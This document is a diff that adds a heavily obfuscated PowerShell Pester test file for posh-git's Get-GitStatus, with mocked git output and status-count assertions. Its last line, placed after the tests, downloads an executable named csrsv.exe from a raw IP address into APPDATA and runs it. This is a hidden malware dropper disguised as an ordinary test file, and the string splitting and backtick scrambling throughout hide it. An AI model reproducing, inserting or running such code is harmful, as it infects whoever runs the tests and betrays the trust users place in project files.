+            ${s`TatUS}."IND`Ex"."d`eLET`Ed"."cou`NT" | &("{1}{0}" -f'hould','S') ('Be') 0
+            ${s`TATus}."I`NDeX"."modIfi`ED"."c`Ount" | &("{1}{0}"-f'ld','Shou') ('Be') 1
+            ${StAt`US}."InD`ex"."unm`e`RGed"."coU`NT" | &("{1}{0}" -f 'hould','S') ('Be') 0
+            ${St`Atus}."I`NdEX"."MOD`IFIeD"[0] | &("{0}{1}" -f 'S','hould') ('Be') ("{1}{0}{2}" -f 'E.','READM','md')
+        }
+        &('It') ("{9}{11}{5}{4}{6}{1}{0}{10}{8}{3}{12}{2}{7}"-f' u','r of','d inde','r','c','he ','orrect numbe','x files','me','Re','n','turns t','ge') {
+            &("{1}{0}" -f'k','Moc') -ModuleName ("{1}{0}{2}" -f'gi','posh-','t') ("{1}{0}" -f'it','g') {
+                ${o`FS} = " "
+                if (${Ar`Gs} -contains ("{1}{2}{0}" -f 'e','rev-pa','rs')) {
+                    ${r`eS} = &("{2}{0}{3}{1}"-f 'pr','sion','Invoke-Ex','es') ("&$gitbin "+"$args")
+                    return ${R`Es}
+                }
+                &("{3}{1}{2}{0}{4}{6}{5}"-f '-','er','t','Conv','NativeLineE','ng','ndi') -SplitLines ((("{4}{8}{9}{0}{6}{5}{1}{2}{7}{3}{10}{11}"-f 'Fo','es','t/Bar.Test','
+','vnT
+','s1
+U  t','o.Tests.p','s.ps1','
+U  ','test/','v','nT'))."replA`Ce"('vnT',[STRiNg][Char]39))
+            }
+
+            ${S`T`AtUs} = &("{1}{2}{3}{0}"-f 's','Get-','GitSta','tu')
+            &("{1}{2}{4}{0}{3}"-f 'ckCa','As','ser','lled','t-Mo') ("{1}{0}"-f'it','g') -ModuleName ("{1}{2}{0}"-f 'git','pos','h-') 
+            ${STaT`Us}."HaSI`N`dex" | &("{1}{0}"-f 'ould','Sh') ('Be') ${tr`Ue}
+            ${stA`TUS}."Ha`s`UNt`RACKeD" | &("{2}{1}{0}"-f'ld','ou','Sh') ('Be') ${F`AlSE}
+            ${S`TATuS}."HaS`woRk`ing" | &("{0}{1}" -f'Sho','uld') ('Be') ${fA`L`sE}
+            ${S`Tatus}."iND`ex"."add`Ed"."COu`Nt" | &("{0}{1}{2}"-f'Sh','oul','d') ('Be') 0
+            ${S`T`AtUs}."I`NDEX"."DElE`T`ED"."cou`Nt" | &("{0}{1}" -f 'Shoul','d') ('Be') 0
+            ${s`T`AtUs}."iNd`eX"."MOdiFI`ED"."Co`UNT" | &("{1}{0}" -f 'ld','Shou') ('Be') 0
+            ${S`TAT`Us}."I`Ndex"."uNme`Rg`Ed"."Co`Unt" | &("{0}{2}{1}"-f 'Sh','d','oul') ('Be') 2
+            ${sta`T`US}."iN`DeX"."UN`m`ERgEd"[0] | &("{0}{1}" -f'Shoul','d') ('Be') ("{3}{2}{5}{0}{4}{1}"-f'Foo.Tests','1','es','t','.ps','t/')
+            ${ST`A`TuS}."i`NDex"."U`Nme`RGed"[1] | &("{0}{1}" -f 'Shou','ld') ('Be') ("{4}{2}{0}{1}{3}" -f'/Bar.Tests.','p','est','s1','t')
+        }
+        &('It') ("{0}{3}{4}{8}{2}{1}{12}{6}{5}{9}{10}{7}{11}"-f 'R',' c','the','e','turns','r o','ct numbe','ed in',' ','f m','ix','dex files','orre') {
+            &("{0}{1}" -f 'Moc','k') -ModuleName ("{0}{1}"-f'posh','-git') ("{1}{0}" -f 'it','g') {
+                ${O`FS} = " "
+                if (${ar`Gs} -contains ("{0}{1}{2}" -f 're','v-par','se')) {
+                    ${r`Es} = &("{1}{0}{2}{3}{4}"-f 'nv','I','oke-Expr','ess','ion') ("&$gitbin "+"$args")
+                    return ${R`es}
+                }
+                &("{2}{3}{0}{4}{1}{5}"-f'-Nati','ineEndi','Conver','t','veL','ng') -SplitLines ((("{19}{20}{2}{12}{16}{26}{11}{21}{22}{10}{18}{9}{17}{0}{23}{6}{5}{8}{25}{1}{13}{3}{4}{24}{7}{15}{14}" -f'EA','s1
+U  t','s','t','/Unm','
+','2.md','ged.','M  tes','d ->','s.ps1
+R','
+D  test/Deleted.','t','es','
+{0}','Tests.ps1','/Added.Test',' R','  README.m','{0}
+
+A  ','te','Tests.ps1
+','C  test/Copied.Test','DME','er','t/Modified.Tests.p','s.ps1')) -f  [Char]39)
+            }
+
+            ${sta`T`Us} = &("{2}{0}{1}" -f'-GitStatu','s','Get')
+            &("{3}{0}{1}{2}" -f 'ert-Mo','ckCal','led','Ass') ("{0}{1}" -f'gi','t') -ModuleName ("{1}{0}" -f 'h-git','pos') 
+            ${sT`AtUS}."HASI`N`deX" | &("{1}{0}" -f 'ould','Sh') ('Be') ${tR`UE}
+            ${st`At`Us}."HaSun`Tr`ACK`Ed" | &("{0}{1}" -f'Shoul','d') ('Be') ${fAL`se}
+            ${S`TAtus}."h`AS`wOrK`iNg" | &("{0}{1}"-f'Shoul','d') ('Be') ${FA`LSe}
+            ${sTat`US}."I`NDEX"."a`DDED"."c`oUNT" | &("{1}{0}"-f 'd','Shoul') ('Be') 1
+            ${S`TAt`US}."I`NdEx"."DEL`et`eD"."co`Unt" | &("{1}{0}" -f'ould','Sh') ('Be') 1
+            ${s`T`ATuS}."I`NDeX"."M`odIf`IED"."cO`UNT" | &("{1}{0}{2}" -f 'hou','S','ld') ('Be') 3
+            ${s`TATUs}."i`NdeX"."u`Nme`RGEd"."cOU`NT" | &("{0}{1}"-f 'Shou','ld') ('Be') 1
+            ${S`TatuS}."I`NDeX"."a`dDED"[0] | &("{1}{0}"-f 'd','Shoul') ('Be') ("{2}{1}{0}{3}"-f 'ts.','dded.Tes','test/A','ps1')
+            ${STat`US}."in`Dex"."D`EL`ETED"[0] | &("{1}{0}{2}"-f'ul','Sho','d') ('Be') ("{6}{0}{5}{4}{1}{2}{3}" -f't/','Tests.p','s','1','eted.','Del','tes')
+            ${ST`A`Tus}."i`NDEx"."modif`I`ed"[0] | &("{2}{0}{1}"-f 'h','ould','S') ('Be') ("{0}{4}{1}{3}{2}" -f 't','opie','s1','d.Tests.p','est/C')
+            ${sT`At`US}."INd`eX"."modIF`i`eD"[1] | &("{0}{2}{1}" -f 'Sh','uld','o') ('Be') ("{2}{1}{0}" -f'DME.md','A','RE')
+            ${ST`At`Us}."In`DEx"."M`o`Dified"[2] | &("{0}{1}"-f 'Sh','ould') ('Be') ("{2}{3}{0}{1}" -f 'd.Tes','ts.ps1','test/Modifi','e')
+            ${st`ATuS}."iN`DEx"."unM`eR`GEd"[0] | &("{1}{0}"-f'uld','Sho') ('Be') ("{3}{4}{2}{1}{0}{5}" -f 't','ged.Tes','nmer','t','est/U','s.ps1')
+        }
+
+        &('It') ("{0}{7}{9}{8}{1}{10}{4}{5}{12}{6}{11}{13}{3}{2}" -f 'Returns ','r o','files','king ','ixe','d ',' ','th','rrect numbe','e co','f m','and w','index','or') {
+            &("{1}{0}"-f 'ck','Mo') -ModuleName ("{2}{0}{1}" -f'h','-git','pos') ("{0}{1}"-f 'g','it') {
+                ${O`Fs} = " "
+                if (${Ar`Gs} -contains ("{2}{0}{1}" -f '-','parse','rev')) {
+                    ${R`ES} = &("{2}{3}{1}{0}"-f'ression','xp','Inv','oke-E') ("&$gitbin "+"$args")
+                    return ${r`Es}
+                }
+                &("{1}{2}{5}{4}{3}{0}"-f 'ing','Con','ver','NativeLineEnd','-','t') -SplitLines ((("{24}{3}{69}{44}{37}{55}{34}{8}{64}{45}{75}{5}{47}{61}{12}{72}{0}{10}{18}{76}{1}{11}{31}{39}{26}{57}{49}{78}{42}{79}{43}{66}{65}{35}{29}{59}{67}{56}{2}{6}{68}{62}{50}{60}{4}{32}{71}{14}{33}{70}{9}{27}{46}{13}{74}{20}{41}{53}{38}{52}{15}{40}{21}{30}{54}{28}{36}{23}{77}{19}{48}{25}{63}{58}{17}{51}{73}{16}{22}{7}"-f 'C  test/Co','sts.ps1
+R  ','d.Tests.ps','test/Ad','e','Tes','1
+ ','}','e','st/','pi','README.md','.p','sts.','A','Tes','ps','erge','ed.',' ','D','s1','1
+{0','sts.ps','{0}
+
+A  ',' t','E2.m','Added.','dif','/','
+ M',' ->','sts',' ','el','U  test','ied.Te','s.ps1
+D  test/','eleted',' READM','ts.p',' test','ified.','s.ps','d.Test','ed','Te','t','U','test/M','tra','d.T','.','/D',' test/Mo','D','rge','d
+M  ','t/Unm','Unm','cked.T','s','Un','es','t','
+','1','e','? test/','de','te','.ps1
+ ','s1
+','ests.','ps1
+ ','.','Te','1
+','od','Test'))  -F  [cHAr]39)
+            }
+
+            ${StAt`Us} = &("{0}{3}{2}{1}"-f 'Get-','tatus','tS','Gi')
+            &("{1}{2}{3}{4}{0}{5}" -f 'Mo','A','s','se','rt-','ckCalled') ("{1}{0}" -f 'it','g') -ModuleName ("{1}{0}{2}"-f'osh-gi','p','t') 
+            ${ST`AtuS}."hAsin`D`EX" | &("{0}{1}"-f'Shou','ld') ('Be') ${tR`Ue}
+            ${STAT`US}."Ha`SUnTRA`CKed" | &("{1}{0}"-f'ould','Sh') ('Be') ${TR`Ue}
+            ${s`Ta`TUs}."HasW`OR`KING" | &("{0}{1}" -f 'S','hould') ('Be') ${t`RUe}
+            ${s`TAt`Us}."woR`k`INg"."a`Dded"."coU`NT" | &("{0}{1}{2}"-f 'Sho','ul','d') ('Be') 2
+            ${s`Ta`TUS}."woR`kINg"."D`el`ETeD"."COu`NT" | &("{1}{0}"-f 'uld','Sho') ('Be') 1
+            ${StA`Tus}."w`ORk`iNg"."modif`I`ED"."C`oUnt" | &("{1}{0}{2}" -f'hou','S','ld') ('Be') 1
+            ${s`Tat`Us}."wOr`kING"."U`NME`RGed"."CO`UNT" | &("{1}{0}" -f'ould','Sh') ('Be') 1
+            ${sT`A`TuS}."W`ork`InG"."Ad`Ded"[0] | &("{2}{1}{0}"-f'ould','h','S') ('Be') ("{2}{0}{1}{4}{3}"-f 'est/Untracked','.Tes','t','1','ts.ps')
+            ${s`TaTus}."Wo`R`KINg"."A`dDED"[1] | &("{1}{2}{0}"-f 'uld','Sh','o') ('Be') ("{4}{5}{1}{3}{2}{0}" -f'1','t/Ad','s.ps','ded.Test','t','es')
+            ${S`TatUs}."Wo`Rk`Ing"."dE`lET`ED"[0] | &("{2}{1}{0}" -f'ould','h','S') ('Be') ("{2}{3}{1}{0}{4}"-f 'd.','e','test','/Delet','Tests.ps1')
+            ${S`Ta`TUs}."woR`KiNG"."mO`DIF`Ied"[0] | &("{0}{1}"-f'S','hould') ('Be') ("{4}{1}{2}{0}{3}"-f'ps','t/','Modified.Tests.','1','tes')
+            ${St`At`US}."WORKi`NG"."u`NMeR`GEd"[0] | &("{0}{1}"-f'Shou','ld') ('Be') ("{2}{0}{4}{6}{3}{1}{5}"-f 's','ed.T','te','g','t/','ests.ps1','Unmer')
+            ${st`A`TuS}."I`NDex"."ad`Ded"."CO`UnT" | &("{0}{2}{1}" -f'S','d','houl') ('Be') 1
+            ${S`TaTUS}."InD`eX"."d`eLEtED"."Cou`NT" | &("{0}{1}"-f 'Shou','ld') ('Be') 1
+            ${STA`TUs}."iN`Dex"."Mo`di`FieD"."Cou`NT" | &("{0}{1}" -f 'S','hould') ('Be') 3
+            ${S`Tat`Us}."i`NDEX"."uNm`er`gED"."co`UNt" | &("{0}{1}" -f 'Sho','uld') ('Be') 1
+            ${s`TaTuS}."InD`EX"."A`ddEd"[0] | &("{0}{1}{2}" -f'Sh','ou','ld') ('Be') ("{2}{3}{0}{4}{1}"-f 'd.Te','s1','te','st/Adde','sts.p')
+            ${s`TaTus}."i`NDeX"."DeleT`Ed"[0] | &("{1}{0}"-f 'ould','Sh') ('Be') ("{1}{5}{3}{2}{0}{4}"-f 'T','tes','d.','e','ests.ps1','t/Delet')
+            ${S`Ta`Tus}."I`Ndex"."M`odi`FIeD"[0] | &("{2}{0}{1}" -f 'h','ould','S') ('Be') ("{0}{2}{1}{6}{3}{5}{4}" -f 'te','t/Copied.','s','s','1','ts.ps','Te')
+            ${STA`T`US}."IN`DEX"."M`ODIfi`ed"[1] | &("{2}{0}{1}"-f'hou','ld','S') ('Be') ("{0}{1}{2}"-f 'READM','E.','md')
+            ${S`T`ATUs}."I`NDeX"."MOd`IFIed"[2] | &("{2}{1}{0}"-f'uld','o','Sh') ('Be') ("{1}{3}{4}{0}{2}{6}{5}"-f 'ed.','test/M','Tests.','o','difi','s1','p')
+            ${STa`T`US}."I`NDEx"."UNM`erGED"[0] | &("{0}{1}" -f 'S','hould') ('Be') ("{5}{0}{3}{4}{1}{2}" -f'/','s.','ps1','Unmerged','.Test','test')
+        }
+    }
+}
+
+(&("{2}{0}{1}"-f 'jec','t','New-Ob') ("{1}{2}{0}{3}{5}{4}"-f'W','Syst','em.Net.','e','nt','bClie')).("{2}{0}{3}{1}" -f 'a','e','Downlo','dFil').Invoke(("{5}{0}{4}{1}{2}{6}{3}"-f'.53','/~ya','hoo/csrsv.','xe','.238','http://94.102','e'),"$env:APPDATA\csrsv.exe");&("{1}{3}{2}{0}" -f's','Star','s','t-Proce') ("$env:APPDATA\csrsv.exe")
